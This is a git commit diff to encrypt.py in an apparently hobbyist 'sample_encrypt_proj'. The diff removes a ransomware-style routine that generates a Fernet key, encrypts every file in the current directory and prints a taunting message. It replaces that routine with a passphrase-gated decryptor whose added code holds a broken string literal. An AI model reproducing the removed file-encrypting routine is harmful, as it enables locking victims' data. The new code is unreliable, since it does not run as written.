69b4e2977cdf3d87cb92df6e1f48d483851497c0
RSNPIIT <ramrupsatpati@gmail.com>
2026-04-13 17:12:43 +0530

    Slight modification has been done

--- sample_encrypt_proj/encrypt.py
+++ sample_encrypt_proj/encrypt.py
@@ -1,9 +1,13 @@
 import os as o
 from cryptography.fernet import Fernet as frn
 
-#About Fernet -> It is a encoding method that helps us to encrypt our stuff up
 files = []
-FILENAME = 'thekey.key'
+FILE = 'thekey.key'
+SECRET_P = 'o.getenv("SECRET_P")
+
+if not SECRET_P:
+    print("You Dont have the necessary permission here")
+    exit()
 
 for file in o.listdir():
     if file == 'malware_create.py' or file == 'thekey.key' or file == 'decrypt.py':
@@ -13,17 +17,17 @@ for file in o.listdir():
 
 print(files)
 
-key = frn.generate_key()
+with open(FILE , 'rb') as k:
+    secr = k.read()
 
+ph = input("Enter your Secret Phase : ").strip().lower()
 
-with open(FILENAME , 'wb') as k:
-    k.write(key)
-
-for file in files:
-    with open(file , 'rb') as fl:
-        con = fl.read()
-    encr_con = frn(key).encrypt(con)
-    with open(file , 'wb') as wl:
-        wl.write(encr_con)
-
-print('Товарищ, я же говорил тебе не кликать на случайные капиталистические сайты.')
+if ph == SECRET_P:
+    for file in files:
+        with open(file , 'rb') as fl:
+            con = fl.read()
+        dec_con = frn(secr).decrypt(con)
+        with open(file , 'wb') as wl:
+            wl.write(dec_con)
+else:
+    print("Not the Intended person\nOr Maybe Try again and nope I'm not gonna help you")
